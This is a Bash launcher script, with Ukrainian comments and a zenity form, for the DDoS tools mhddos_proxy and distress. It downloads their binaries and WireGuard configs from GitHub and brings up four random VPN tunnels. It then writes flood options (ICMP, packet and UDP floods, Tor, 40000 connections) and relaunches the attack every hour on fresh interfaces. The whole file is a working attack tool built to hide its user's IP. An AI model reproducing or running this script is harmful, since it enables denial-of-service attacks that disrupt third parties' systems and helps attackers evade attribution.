#!/bin/bash

set -e

# Перевірка користувача
if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo"
    else
        zenity --error --text="sudo не знайдено. Встановіть або увійдіть як root."; exit 1
    fi
fi

# Визначення пакетного менеджера
if command -v apt >/dev/null 2>&1; then
    PKG_MANAGER="apt"
    UPDATE_CMD="$SUDO apt update -y"
    INSTALL_CMD="$SUDO apt install -y"
elif command -v apt-get >/dev/null 2>&1; then
    PKG_MANAGER="apt-get"
    UPDATE_CMD="$SUDO apt-get update -y"
    INSTALL_CMD="$SUDO apt-get install -y"
elif command -v dnf >/dev/null 2>&1; then
    PKG_MANAGER="dnf"
    UPDATE_CMD="$SUDO dnf check-update || true"
    INSTALL_CMD="$SUDO dnf install -y"
elif command -v yum >/dev/null 2>&1; then
    PKG_MANAGER="yum"
    UPDATE_CMD="$SUDO yum check-update || true"
    INSTALL_CMD="$SUDO yum install -y"
elif command -v apk >/dev/null 2>&1; then
    PKG_MANAGER="apk"
    UPDATE_CMD="$SUDO apk update"
    INSTALL_CMD="$SUDO apk add"
else
    zenity --error --text="Підтримуваний пакетний менеджер не знайдено."; exit 1
fi

# Встановлення залежностей
$UPDATE_CMD
$INSTALL_CMD curl wget git screen sed wireguard zenity

# Підготовка директорій
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$MODULE_DIR" "$WG_DIR"

# Графічний інтерфейс вибору параметрів
USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
    --text="Вкажіть параметри запуску" \
    --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
    --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
    --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen")

[ -z "$USER_SELECTION" ] && { zenity --error --text="Запуск скасовано"; exit 1; }

MODULE_CHOICE=$(echo "$USER_SELECTION" | cut -d'|' -f1)
EDIT_INI=$(echo "$USER_SELECTION" | cut -d'|' -f2)
RUN_MODE=$(echo "$USER_SELECTION" | cut -d'|' -f3)

# Вибір модуля
case $MODULE_CHOICE in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        PARAM="--ifaces"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        PARAM="--interface"
        ;;
esac

# Завантаження модулів
[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
chmod +x "$MODULE"

# Завантаження WG-конфігів
WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
WG_RAW_BASE="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/k7771/Kaljan747/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')

for url in $CONF_LIST; do
    file=$(basename "$url")
    wget -qO "$WG_DIR/$file" "$url"
done

$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

# Основний цикл перезапуску
while true; do
    pkill -f "$MODULE" 2>/dev/null || screen -S "$MODULE_NAME" -X quit 2>/dev/null || true

    wg show interfaces | xargs -I{} $SUDO wg-quick down {} || true

    WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf | head -n 4))
    WG_IFACES=()
    for conf in "${WG_FILES[@]}"; do
        IFACE_NAME=$(basename "$conf" .conf)
        $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
        $SUDO wg-quick up "$conf"
        WG_IFACES+=("$IFACE_NAME")
    done

    VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
    VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

    echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=********" > "$MODULE_DIR/mhddos.ini"
    echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=********" > "$MODULE_DIR/distress.ini"

    [ "$EDIT_INI" = "Так" ] && zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування $CONFIG_FILE" > "$CONFIG_FILE.tmp" && mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"

    case "$RUN_MODE" in
        "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
        "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
        "без screen") "$MODULE" $(cat "$CONFIG_FILE") ;;
    esac

    sleep 3540
done
